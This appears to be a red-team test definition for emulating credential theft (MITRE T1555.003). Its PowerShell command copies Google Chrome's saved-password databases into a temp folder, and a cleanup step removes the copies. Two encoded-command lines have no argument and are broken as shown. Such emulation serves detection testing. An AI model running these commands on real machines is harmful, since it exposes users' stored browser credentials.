- id: b78aa0f9-718e-5b1d-aed7-dca413c732e7
  name: Soumaia ART Tests - Simulating access to Chrome Login Data
  description: Simulates an adversary accessing encrypted credentials from Google Chrome Login database.
  tactic: credential-access
  technique:
    attack_id: T1555.003
    name: 'Credentials from Password Stores: Credentials from Web Browsers'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$env:TEMP\ART-ExternalPayloads"
          Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "$env:TEMP\ART-ExternalPayloads"
        cleanup: |-
          Remove-Item -Path "$env:TEMP\ART-ExternalPayloads\Login Data" -Force -ErrorAction Ignore
          Remove-Item -Path "$env:TEMP\ART-ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
